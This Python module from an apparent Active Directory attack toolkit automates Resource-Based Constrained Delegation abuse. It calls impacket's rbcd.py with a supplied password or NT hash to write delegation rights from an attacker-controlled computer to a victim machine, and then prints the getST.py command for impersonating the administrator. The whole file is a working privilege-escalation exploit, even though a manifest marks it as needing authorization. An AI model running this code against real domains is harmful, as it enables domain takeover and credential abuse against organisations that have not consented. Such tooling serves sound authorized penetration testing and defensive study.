"""RBCD (Resource-Based Constrained Delegation) abuse via msDS-AllowedToActOnBehalfOfOtherIdentity."""
import subprocess
import sys
import shutil
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.acl.rbcd_abuse.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["ldap_modification", "kerberos_delegation"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1550.003"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    target_computer = getattr(args, "target_computer", None)
    attacker_computer = getattr(args, "attacker_computer", None)
    dc_ip = getattr(args, "dc_ip", args.target)
    action = getattr(args, "rbcd_action", "write")

    if not target_computer:
        print("[!] --target-computer required (victim machine)", file=sys.stderr)
        return 1

    if action == "write":
        if not attacker_computer:
            print("[!] --attacker-computer required for write action", file=sys.stderr)
            return 1

        print(f"[*] RBCD: delegating {attacker_computer} → {target_computer} on {dc_ip}")

        if shutil.which("rbcd.py"):
            cmd = [
                "rbcd.py",
                "-action", "write",
                "-delegate-from", attacker_computer,
                "-delegate-to", target_computer,
                "-dc-ip", dc_ip,
                f"{args.domain}\\{cred.username}",
            ]
            if cred.has_hash:
                cmd.extend(["-hashes", f"{cred.lm_hash}:{cred.nt_hash}"])
            elif cred.password:
                cmd.extend(["-p", cred.password])

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            print(result.stdout)
            if result.returncode == 0:
                print(f"\n[*] Next: getST.py -spn cifs/{target_computer} -impersonate administrator {args.domain}\\{attacker_computer}")
            return result.returncode

    elif action == "read":
        print(f"[*] RBCD read: checking delegation on {target_computer}")
        if shutil.which("rbcd.py"):
            cmd = [
                "rbcd.py", "-action", "read",
                "-delegate-to", target_computer,
                "-dc-ip", dc_ip,
                f"{args.domain}\\{cred.username}",
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            print(result.stdout)
            return result.returncode

    print("[!] rbcd.py not found  -  use bloodyAD or manual LDAP", file=sys.stderr)
    return 1
